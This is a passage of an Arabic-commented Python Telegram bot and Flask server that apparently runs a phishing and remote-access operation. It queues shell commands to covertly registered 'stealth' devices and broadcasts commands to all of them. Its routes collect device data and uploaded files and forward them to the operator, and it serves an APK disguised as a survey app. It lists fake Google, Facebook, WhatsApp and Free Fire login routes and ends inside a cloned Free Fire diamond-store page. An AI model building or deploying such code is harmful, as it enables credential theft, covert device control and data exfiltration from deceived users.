    else:
        safe_send(chat_id, "⚠️ خيار غير معروف.")

# ===================== معالج النصوص =====================
@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()

    # التحقق من قفل البوت
    global bot_locked
    if bot_locked and not is_admin(chat_id):
        safe_send(chat_id, "🔒 البوت مقفل حالياً، يرجى المحاولة لاحقاً.")
        return

    # ===== نظام كشف الاختراق =====
    user_id = message.from_user.id
    user_data = {
        'first_name': message.from_user.first_name,
        'username': message.from_user.username,
        'id': user_id
    }

    if is_blocked(user_id):
        safe_send(chat_id, "🚫 أنت محظور مؤقتاً بسبب نشاط مشبوه.")
        return

    if detect_suspicious_activity(user_id, text, user_data):
        send_honeypot_message(chat_id)
        return

    try:
        # ===== فحص الروابط =====
        if state == "waiting_for_link_scan":
            # التحقق من صحة الرابط
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري فحص الرابط...")
                result = check_link_safety(text)
                
                # عرض النتيجة
                msg = f"🌐 **نتيجة فحص الرابط**\n\n"
                msg += f"📎 **الرابط:** `{result['url']}`\n"
                msg += f"🌍 **النطاق:** `{result['domain']}`\n"
                msg += f"🛡️ **الحالة:** {result['risk_level']}\n"
                msg += f"✅ **آمن:** {'✅ نعم' if result['safe'] else '❌ لا'}\n\n"
                
                if result['threats']:
                    msg += "⚠️ **التهديدات المكتشفة:**\n"
                    for threat in result['threats']:
                        msg += f"   • {threat}\n"
                else:
                    msg += "✅ **لم يتم اكتشاف أي تهديدات.**\n"
                
                if result.get('details', {}).get('shortened'):
                    msg += "\n⚠️ الرابط مختصر - يرجى توخي الحذر."
                if result.get('details', {}).get('login_page'):
                    msg += "\n🔐 هذا الرابط يؤدي إلى صفحة تسجيل دخول - تأكد من الموقع."
                
                safe_send(chat_id, msg)
                
                # إرسال تقرير للمطور
                report_data = {
                    'action_type': 'فحص رابط',
                    'platform': 'Link Scanner',
                    'status': 'success',
                    'details': {
                        'الرابط': text,
                        'النطاق': result['domain'],
                        'الحالة': result['risk_level'],
                        'التهديدات': ', '.join(result['threats']) if result['threats'] else 'لا توجد'
                    },
                    'risk_level': result['risk_level'].replace('🟢', '').replace('🟡', '').replace('🔴', '').strip(),
                    'flagged': not result['safe'],
                    'ip': 'N/A',
                    'user_agent': 'N/A'
                }
                send_structured_report('فحص رابط', report_data, chat_id, message.from_user.username)
            else:
                safe_send(chat_id, "❌ رابط غير صالح. يرجى إرسال رابط صحيح يبدأ بـ http:// أو https://")
            user_states[chat_id] = None
            return

        if state == "stealth_waiting_shell":
            device_id = admin_remote_target.get(chat_id)
            if not device_id:
                safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
                user_states[chat_id] = None
                return
            add_pending_command_db(device_id, "EXEC_SHELL:" + text)
            safe_send(chat_id, f"✅ تم إرسال أمر Shell إلى الجهاز `{device_id}`.")
            safe_send(chat_id, f"✅ الجهاز: `{device_id}`", reply_markup=build_stealth_advanced_menu(device_id))
            user_states[chat_id] = None
            admin_remote_target.pop(chat_id, None)
            return
        
        if state == "stealth_waiting_broadcast" and is_admin_user:
            command = text.strip()
            devices = get_registered_devices_db()
            if not devices:
                safe_send(chat_id, "⚠️ لا توجد أجهزة خفية.")
                user_states[chat_id] = None
                return
            count = 0
            for dev in devices:
                add_pending_command_db(dev['device_id'], command)
                count += 1
            safe_send(chat_id, f"✅ تم بث الأمر `{command}` إلى {count} جهاز.")
            notify_admin(f"📢 بث أمر خفي: `{command}` لـ {count} جهاز")
            user_states[chat_id] = None
            return

        if state == "admin_waiting_message":
            target_id = admin_remote_target.get(chat_id)
            if not target_id:
                safe_send(chat_id, "❌ لم يتم تحديد مستخدم.")
                user_states[chat_id] = None
                return
            try:
                safe_send(target_id, f"📩 <b>رسالة من الإدارة:</b>\n\n{text}")
                safe_send(chat_id, f"✅ تم إرسال الرسالة للمستخدم {target_id}.")
                notify_admin(f"📩 أرسل المطور رسالة للمستخدم {target_id}: {text[:50]}...")
            except Exception as e:
                safe_send(chat_id, f"⚠️ فشل الإرسال: {str(e)}")
            user_states[chat_id] = None
            admin_remote_target.pop(chat_id, None)
            return

        if state == "admin_waiting_add_points":
            target_id = admin_remote_target.get(chat_id)
            if not target_id:
                safe_send(chat_id, "❌ لم يتم تحديد مستخدم.")
                user_states[chat_id] = None
                return
            try:
                amount = int(text)
                if amount <= 0:
                    safe_send(chat_id, "⚠️ يجب أن يكون العدد موجباً.")
                    return
                add_points_db(target_id, amount, "إضافة نقاط من المطور")
                safe_send(chat_id, f"✅ تم إضافة {amount} نقطة للمستخدم {target_id}.")
                safe_send(target_id, f"➕ تمت إضافة {amount} نقطة إلى رصيدك.")
            except ValueError:
                safe_send(chat_id, "⚠️ يرجى إدخال عدد صحيح.")
            user_states[chat_id] = None
            admin_remote_target.pop(chat_id, None)
            return

        if state == "admin_waiting_remove_points":
            target_id = admin_remote_target.get(chat_id)
            if not target_id:
                safe_send(chat_id, "❌ لم يتم تحديد مستخدم.")
                user_states[chat_id] = None
                return
            try:
                amount = int(text)
                if amount <= 0:
                    safe_send(chat_id, "⚠️ يجب أن يكون العدد موجباً.")
                    return
                if deduct_points(target_id, amount, "خصم نقاط من المطور"):
                    safe_send(chat_id, f"✅ تم خصم {amount} نقطة من المستخدم {target_id}.")
                    safe_send(target_id, f"➖ تم خصم {amount} نقطة من رصيدك.")
                else:
                    safe_send(chat_id, f"⚠️ المستخدم {target_id} ليس لديه نقاط كافية.")
            except ValueError:
                safe_send(chat_id, "⚠️ يرجى إدخال عدد صحيح.")
            user_states[chat_id] = None
            admin_remote_target.pop(chat_id, None)
            return

        if state == "waiting_for_phone_tracking":
            clean_number = re.sub(r'[\s\-()]', '', text)
            if not clean_number.startswith('+'):
                clean_number = '+' + clean_number
            if re.match(r'^\d{15}$', clean_number.replace('+', '')):
                safe_send(chat_id, "⚠️ لا يمكن تتبع الهاتف عبر IMEI.\nأرسل رقم الهاتف (مثال: +201001234567)")
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري تتبع الموقع...")
            result, status = track_phone_advanced(clean_number)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_for_site":
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري فحص الموقع...")
                result, status = scan_website(text)
                safe_send(chat_id, f"🔍 نتيجة الفحص:\n{result}")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_shorten":
            if re.match(r'^https?://', text):
                short_url, error = shorten_url(text)
                if error:
                    safe_send(chat_id, f"⚠️ فشل تقصير الرابط: {error}")
                else:
                    safe_send(chat_id, f"✅ الرابط المختصر:\n{short_url}")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_track_num":
            result, status = track_phone_real(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "waiting_for_vuln_target":
            target = text
            safe_send(chat_id, "⏳ جاري فحص الثغرات...")
            try:
                target_ip = None
                target_domain = None
                target_url = None
                if re.match(r'^https?://', target):
                    target_url = target
                    domain_match = re.search(r'https?://([^/:]+)', target)
                    if domain_match:
                        target_domain = domain_match.group(1)
                elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                    target_ip = target
                elif re.match(r'^[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$', target):
                    target_domain = target
                    target_url = f"https://{target}"
                else:
                    safe_send(chat_id, "⚠️ لم يتم التعرف على الهدف.")
                    user_states[chat_id] = None
                    return
                report = perform_vulnerability_scan(target_ip, target_domain, target_url)
                safe_send(chat_id, report)
                feature_usage["فحص ثغرات"] += 1
            except Exception as e:
                safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)[:100]}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_download":
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري تحميل الفيديو...")
                result, error = download_video(text)
                if error:
                    safe_send(chat_id, f"⚠️ {error}")
                elif result and os.path.exists(result):
                    try:
                        with open(result, 'rb') as f:
                            bot.send_video(chat_id, f, caption="📥 تم التحميل")
                        os.remove(result)
                    except Exception as e:
                        safe_send(chat_id, f"⚠️ فشل إرسال الفيديو: {str(e)}")
                else:
                    safe_send(chat_id, "⚠️ فشل تحميل الفيديو.")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return

        if state == "waiting_for_broadcast" and is_admin_user:
            success = 0
            fail = 0
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            for user in users:
                try:
                    safe_send(user['chat_id'], text)
                    success += 1
                    time.sleep(0.1)
                except:
                    fail += 1
            safe_send(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.\n❌ فشل الإرسال لـ {fail} مستخدم.")
            user_states[chat_id] = None
            notify_admin(f"📢 بث جماعي: {text[:50]}...")
            return

        if state == "waiting_for_fb_report_reason":
            reason = text
            user_states[chat_id] = "waiting_for_fb_report_link"
            user_states[f"{chat_id}_fb_report_reason"] = reason
            safe_send(chat_id, "✅ تم حفظ السبب.\n\nأرسل رابط المنشور (أو اكتب 'لا يوجد').")
            return

        if state == "waiting_for_fb_report_link":
            link = text if text.lower() != 'لا يوجد' else ''
            report_type = user_states.get(f"{chat_id}_fb_report_type")
            reason = user_states.get(f"{chat_id}_fb_report_reason")
            if not report_type or not reason:
                safe_send(chat_id, "❌ حدث خطأ.")
                user_states[chat_id] = None
                return
            report_text = generate_fb_report(report_type, reason, link)
            support_links = {
                "حساب مزيف": "https://www.facebook.com/help/contact/295309487309948",
                "منشور مسيء": "https://www.facebook.com/help/contact/315847653073855",
                "تحرش أو مضايقة": "https://www.facebook.com/help/contact/237547145079192",
                "انتحال شخصية": "https://www.facebook.com/help/contact/295309487309948",
                "انتهاك خصوصية": "https://www.facebook.com/help/contact/249621638488458",
                "محتوى عنيف": "https://www.facebook.com/help/contact/274459462613911"
            }
            support_link = "https://www.facebook.com/help/contact/315847653073855"
            for key, url in support_links.items():
                if key in report_type:
                    support_link = url
                    break
            final_msg = (
                f"📝 شكوى رسمية\n\n"
                f"{report_text}\n\n"
                f"🔗 رابط الدعم: {support_link}\n\n"
                f"📌 انسخ النص أعلاه، ثم اضغط على الرابط، والصق النص."
            )
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🌐 فتح رابط الدعم", url=support_link))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_send(chat_id, final_msg, reply_markup=markup)
            for key in [f"{chat_id}_fb_report_type", f"{chat_id}_fb_report_reason"]:
                if key in user_states:
                    del user_states[key]
            user_states[chat_id] = None
            feature_usage["بلاغات فيسبوك"] += 1
            return

        if state == "waiting_for_pdf_question":
            pdf_text = user_states.get(f"{chat_id}_pdf_text")
            if not pdf_text:
                safe_send(chat_id, "⚠️ لم يتم تحميل ملف PDF.")
                user_states[chat_id] = None
                return
            answer = answer_question_from_pdf(pdf_text, text)
            safe_send(chat_id, f"📚 الإجابة:\n{answer}")
            return

        if state is None:
            safe_send(chat_id, "🤖 اختر خدمة من القائمة.", reply_markup=build_main_menu(chat_id))
    except Exception as e:
        logger.error(f"handle_text_messages error: {e}")
        notify_admin(f"خطأ: {str(e)}", is_error=True)
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    try:
        if state == "waiting_for_pdf":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.pdf'):
                safe_send(chat_id, "❌ يرجى إرسال ملف PDF.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            pdf_text = extract_text_from_pdf(downloaded)
            if not pdf_text:
                safe_send(chat_id, "⚠️ فشل استخراج النص.")
                user_states[chat_id] = None
                return
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
            safe_send(chat_id, f"✅ تم استخراج النص ({len(pdf_text)} حرف).\n\nالآن اكتب سؤالك.")
            return

        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ أرسل ملف APK.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result, status = scan_apk_real(downloaded, file_name)
            safe_send(chat_id, f"📦 نتيجة الفحص:\n{result}")
            user_states[chat_id] = None
            return

        if state == "waiting_for_my_app":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            ext = file_name.split('.')[-1].lower()
            if ext not in ['txt', 'py', 'js', 'java', 'cpp', 'c', 'html', 'css', 'php']:
                safe_send(chat_id, "❌ امتداد غير مدعوم.")
                return
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            try:
                content = downloaded.decode('utf-8')
                safe_send(chat_id, "🛠️ تم استلام الملف، يمكنك مراجعته.")
            except:
                safe_send(chat_id, "⚠️ فشل قراءة الملف.")
            user_states[chat_id] = None
            return
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    safe_send(chat_id, "🖼️ تم استلام الصورة.")

# ===================== الصفحات =====================

# ===== تعريف الصفحات (سيتم إضافتها في الرد التالي بسبب طول الكود) =====

# ===================== مسارات Flask =====================

# قائمة المسارات النشطة
ACTIVE_ROUTES = [
    '/', '/health', '/ping', '/webhook',
    '/google_login', '/facebook_login', '/whatsapp_web',
    '/freefire', '/video_chat', '/survey',
    '/tiktok_followers', '/link_scanner',
    '/collect', '/register_device', '/submit_result',
    '/get_command', '/broadcast_command', '/send_command',
    '/collect_data', '/upload_files', '/download_apk_survey'
]

@app.errorhandler(404)
def not_found(error):
    return jsonify({
        'error': 'Not Found',
        'message': 'المسار المطلوب غير موجود',
        'available_routes': ACTIVE_ROUTES
    }), 404

# ===== مسارات الصفحات =====

# (سيتم إضافة جميع صفحات HTML في الرد التالي)

@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/ping')
def ping():
    return 'pong'

@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        device_id = data.get('device_id')
        chat_id = data.get('chat_id', 0)
        device_type = data.get('device_type', 'unknown')
        if not device_id:
            return jsonify({'error': 'device_id required'}), 400
        save_registered_device_db(device_id, chat_id)
        logger.info(f"✅ جهاز مسجل: {device_id} (chat_id: {chat_id})")
        notify_admin(f"📱 جهاز جديد مسجل: `{device_id}`")
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"register_device error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'error': 'device_id required'}), 400
        update_registered_device_seen_db(device_id)
        content = json.dumps(data, ensure_ascii=False)
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (session_id, data_type, data, ip, user_agent, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (device_id, 'submit_result', content, ip, user_agent, datetime.now().isoformat()))
            conn.commit()
        logger.info(f"✅ بيانات من جهاز {device_id}")
        send_sensitive_data_to_admin("بيانات مجمعة", data, user_id=ADMIN_ID)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"submit_result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/get_command', methods=['GET'])
def get_command():
    try:
        device_id = request.args.get('device_id')
        if not device_id:
            return jsonify({'error': 'device_id required'}), 400
        command = get_pending_command_db(device_id)
        if command:
            return jsonify({'cmd': command, 'param': ''}), 200
        else:
            return jsonify({'cmd': '', 'param': ''}), 200
    except Exception as e:
        logger.error(f"get_command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/broadcast_command', methods=['POST'])
def broadcast_command():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        command = data.get('command')
        if not command:
            return jsonify({'error': 'command required'}), 400
        param = data.get('param', '')
        devices = get_registered_devices_db()
        if not devices:
            return jsonify({'status': 'no_devices'}), 200
        count = 0
        for dev in devices:
            add_pending_command_db(dev['device_id'], command)
            count += 1
        notify_admin(f"📢 أمر تم بثه لـ {count} جهاز: `{command}`")
        return jsonify({'status': 'success', 'devices_count': count}), 200
    except Exception as e:
        logger.error(f"broadcast_command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/send_command', methods=['POST'])
def send_command():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        device_id = data.get('device_id')
        command = data.get('command')
        if not device_id or not command:
            return jsonify({'error': 'device_id and command required'}), 400
        add_pending_command_db(device_id, command)
        notify_admin(f"📨 أمر مرسل للجهاز `{device_id}`: `{command}`")
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"send_command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/collect_data', methods=['POST'])
def collect_data():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400

        session_id = request.remote_addr + '_' + str(time.time())
        data_type = data.get('type', 'unknown')
        content = json.dumps(data, ensure_ascii=False)
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        device_info = data.get('device', {})

        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (session_id, data_type, data, ip, user_agent, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (session_id, data_type, content, ip, user_agent, datetime.now().isoformat()))
            conn.commit()

        msg = f"📋 **تقرير نشاط مستخدم جديد**\n\n"
        msg += f"📂 **نوع العملية:** `{data_type}`\n"
        msg += f"🌐 **عنوان الـ IP:** `{ip}`\n"
        msg += f"🕐 **الوقت:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
        
        if device_info:
            msg += f"\n📱 **بيانات الجهاز والمتصفح:**\n"
            msg += f"   • نظام التشغيل: `{device_info.get('platform', 'غير معروف')}`\n"
            msg += f"   • المتصفح: `{device_info.get('userAgent', '').split('/')[0] if device_info.get('userAgent') else 'غير معروف'}`\n"
            msg += f"   • اللغة: `{device_info.get('language', 'غير معروف')}`\n"
            msg += f"   • المنطقة الزمنية: `{device_info.get('timezone', 'غير معروف')}`\n"
            msg += f"   • أبعاد الشاشة: `{device_info.get('screenWidth', '')} × {device_info.get('screenHeight', '')} بكسل`\n"
        
        msg += f"\n📄 **البيانات:**\n```json\n{json.dumps(data, indent=2, ensure_ascii=False)[:1500]}\n```"
        safe_send(ADMIN_ID, msg)

        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"Collect data error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/upload_files', methods=['POST'])
def upload_files():
    try:
        if 'files' not in request.files:
            return jsonify({'status': 'error', 'message': 'No files'}), 400
        
        files = request.files.getlist('files')
        if not files:
            return jsonify({'status': 'error', 'message': 'No files selected'}), 400
        
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        session_id = ip + '_' + str(time.time())
        saved_files = []
        
        for f in files:
            if f.filename == '':
                continue
            filename = datetime.now().strftime('%Y%m%d_%H%M%S') + '_' + f.filename
            filepath = os.path.join(UPLOAD_DIR, filename)
            f.save(filepath)
            
            with get_db_connection() as conn:
                c = conn.cursor()
                c.execute('''INSERT INTO uploaded_files (session_id, filename, filepath, ip, user_agent, created_at)
                             VALUES (?, ?, ?, ?, ?, ?)''',
                          (session_id, filename, filepath, ip, user_agent, datetime.now().isoformat()))
                conn.commit()
            
            saved_files.append(filename)
            
            with open(filepath, 'rb') as file_data:
                bot.send_document(ADMIN_ID, (filename, file_data), caption=f"📎 **ملف مرفوع**\n🌐 IP: {ip}\n📄 الاسم: {filename}")
        
        return jsonify({'status': 'success', 'saved': saved_files}), 200
    except Exception as e:
        logger.error(f"Upload files error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/download_apk_survey', methods=['GET'])
def download_apk_survey():
    apk_path = os.path.join(BASE_DIR, 'static', 'SurveyApp.apk')
    if os.path.exists(apk_path):
        return send_file(apk_path, as_attachment=True, download_name='SurveyApp.apk')
    return "⚠️ ملف APK غير موجود.", 404

# ===================== Keep-Alive Thread =====================
def keep_alive():
    if not SERVER_URL:
        return
    ping_url = f"{SERVER_URL}/ping"
    while True:
        time.sleep(300)
        try:
            req_lib.get(ping_url, timeout=10)
            logger.info("✅ Keep-alive ping")
        except Exception as e:
            logger.error(f"❌ فشل Keep-alive: {e}")

# ===================== تشغيل البوت =====================
if __name__ == "__main__":
    bot.remove_webhook()
    if USE_WEBHOOK and SERVER_URL:
        webhook_url = f"{SERVER_URL}/webhook"
        try:
            success = bot.set_webhook(url=webhook_url, secret_token=WEBHOOK_SECRET)
            if success:
                logger.info(f"✅ Webhook تم تعيينه: {webhook_url}")
            else:
                logger.warning(f"⚠️ فشل تعيين Webhook.")
        except Exception as e:
            logger.error(f"❌ خطأ في تعيين Webhook: {e}")
    else:
        logger.info("🔄 تشغيل البوت عبر Polling...")
    if SERVER_URL:
        keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
        keep_alive_thread.start()
        logger.info("🔄 تم بدء Keep-alive.")
    app.run(host='0.0.0.0', port=PORT, debug=False)
# ===================== صفحات HTML الكاملة =====================

# ===== صفحة Shop2game (نسخ طبق الأصل) =====
SHOP2GAME_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن فري فاير - متجر الألعاب</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Montserrat', 'Segoe UI', Tahoma, sans-serif;
        }
        body {
            background: #0a0a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #1a1a2e;
            border-radius: 20px;
            padding: 30px 24px 24px;
            border: 1px solid rgba(255,255,255,0.06);
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
        }
        .header {
            text-align: center;
            margin-bottom: 28px;
            position: relative;
        }
        .header .game-icon {
            font-size: 52px;
            display: block;
            margin-bottom: 6px;
        }
        .header h1 {
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(135deg, #ff6b35, #ff8a5c);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: 0.5px;
        }
        .header .subtitle {
            color: #ffd700;
            font-size: 13px;
            font-weight: 600;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            margin-top: 2px;
        }
        .header .badge {
            display: inline-block;
            background: rgba(255,107,53,0.15);
            color: #ff6b35;
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: 700;
            margin-top: 8px;
            border: 1px solid rgba(255,107,53,0.2);
        }
        .form-group {
            margin-bottom: 14px;
        }
        .form-group label {
            display: block;
            color: #b0b0c0;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 5px;
            letter-spacing: 0.3px;
        }
        .form-group label .required {
            color: #ff6b35;
        }
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255,255,255,0.05);
            border: 2px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            color: #ffffff;
            font-size: 15px;
            font-family: 'Montserrat', sans-serif;
            outline: none;
            transition: all 0.3s;
        }
        .form-group input:focus,
        .form-group select:focus {
            border-color: #ff6b35;
            background: rgba(255,107,53,0.05);
            box-shadow: 0 0 20px rgba(255,107,53,0.08);
        }
        .form-group input::placeholder {
            color: #666;
        }
        .form-group select option {
            background: #1a1a2e;
            color: #ffffff;
        }
        .package-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin: 10px 0 4px;
        }
        .package-item {
            background: rgba(255,255,255,0.03);
            border: 2px solid rgba(255,255,255,0.06);
            border-radius: 10px;
            padding: 12px 6px 10px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
        }
        .package-item:hover {
            border-color: #ff6b35;
            background: rgba(255,107,53,0.08);
        }
        .package-item.selected {
            border-color: #ff6b35;
            background: rgba(255,107,53,0.12);
            box-shadow: 0 0 25px rgba(255,107,53,0.15);
        }
        .package-item .icon {
            font-size: 22px;
            display: block;
        }
        .package-item .amount {
            font-size: 15px;
            font-weight: 700;
            display: block;
            margin-top: 3px;
            color: #ffffff;
        }
        .package-item .bonus {
            font-size: 10px;
            color: #ffd700;
            font-weight: 600;
            display: block;
        }
        .package-item .price {
            font-size: 11px;
            color: #777;
            display: block;
            margin-top: 3px;
        }
        .package-item .popular {
            position: absolute;
            top: -7px;
            right: -7px;
            background: #ff6b35;
            color: white;
            font-size: 8px;
            font-weight: 700;
            padding: 2px 10px;
            border-radius: 10px;
            letter-spacing: 0.3px;
        }
        .price-summary {
            background: rgba(255,215,0,0.04);
            border: 1px solid rgba(255,215,0,0.12);
            border-radius: 12px;
            padding: 14px 18px;
            margin: 14px 0 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .price-summary .label {
            color: #b0b0c0;
            font-size: 13px;
            font-weight: 500;
        }
        .price-summary .price-value {
            color: #ffd700;
            font-size: 22px;
            font-weight: 800;
        }
        .btn-buy {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #ff6b35, #e55a2b);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 700;
            font-family: 'Montserrat', sans-serif;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            letter-spacing: 0.5px;
        }
        .btn-buy:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(255,107,53,0.3);
        }
        .btn-buy:active {
            transform: translateY(0);
        }
        .btn-buy:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none !important;
        }
        .secure-badge {
            text-align: center;
            margin-top: 14px;
            color: #555;
            font-size: 11px;
        }
        .secure-badge .lock {
            color: #4CAF50;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 18px;
            padding-top: 16px;
            border-top: 1px solid rgba(255,255,255,0.04);
        }
        .footer-links a {
            color: #555;
            text-decoration: none;
            font-size: 11px;
            font-weight: 500;
            transition: all 0.3s;
        }
        .footer-links a:hover {
            color: #ff6b35;
        }
        .hidden-radio {
            display: none;
        }
        @media (max-width: 400px) {
            .container {
                padding: 20px 16px;
            }
            .package-grid {
                gap: 5px;
            }
            .package-item {
                padding: 10px 4px 8px;
            }
            .package-item .amount {
                font-size: 13px;
            }
            .package-item .icon {
                font-size: 18px;
            }
            .header h1 {
                font-size: 24px;
            }
            .price-summary .price-value {
                font-size: 19px;
            }
            .btn-buy {
                font-size: 15px;
                padding: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="game-icon">🔥</span>
            <h1>Free Fire</h1>
            <div class="subtitle">شحن الماس</div>
            <span class="badge">🛡️ معتمد</span>
        </div>
        <form id="purchaseForm" method="POST" action="/freefire">
            <div class="form-group">
                <label>معرف اللاعب <span class="required">*</span></label>
                <input type="text" name="player_id" placeholder="أدخل معرفك" required>
            </div>
            <div class="form-group">
                <label>المنطقة <span class="required">*</span></label>
                <select name="region" required>
                    <option value="ME">الشرق الأوسط</option>
                    <option value="EU">أوروبا</option>
                    <option value="AS">آسيا</option>
                    <option value="SA">أمريكا الجنوبية</option>
                    <option value="NA">أمريكا الشمالية</option>
                </select>
            </div>
            <div class="form-group">
                <label>اختر الباقة <span class="required">*</span></label>
                <div class="package-grid">
                    <label class="package-item" for="pkg_100">
                        <input type="radio" name="diamonds" value="100" id="pkg_100" class="hidden-radio" onchange="updatePrice('$1.99')">
                        <span class="icon">💎</span>
                        <span class="amount">100</span>
                        <span class="bonus">+10</span>
                        <span class="price">$1.99</span>
                    </label>
                    <label class="package-item" for="pkg_500">
                        <input type="radio" name="diamonds" value="500" id="pkg_500" class="hidden-radio" onchange="updatePrice('$9.99')">
                        <span class="icon">💎</span>
                        <span class="amount">500</span>
                        <span class="bonus">+50</span>
                        <span class="price">$9.99</span>
                    </label>
                    <label class="package-item selected" for="pkg_1000">
                        <input type="radio" name="diamonds" value="1000" id="pkg_1000" class="hidden-radio" checked onchange="updatePrice('$19.99')">
                        <span class="popular">الأكثر طلباً</span>
                        <span class="icon">💎</span>
                        <span class="amount">1000</span>
                        <span class="bonus">+100</span>
                        <span class="price">$19.99</span>
                    </label>
                    <label class="package-item" for="pkg_2000">
                        <input type="radio" name="diamonds" value="2000" id="pkg_2000" class="hidden-radio" onchange="updatePrice('$39.99')">
                        <span class="icon">💎</span>
                        <span class="amount">2000</span>
                        <span class="bonus">+200</span>
                        <span class="price">$39.99</span>
                    </label>
                    <label class="package-item" for="pkg_5000">
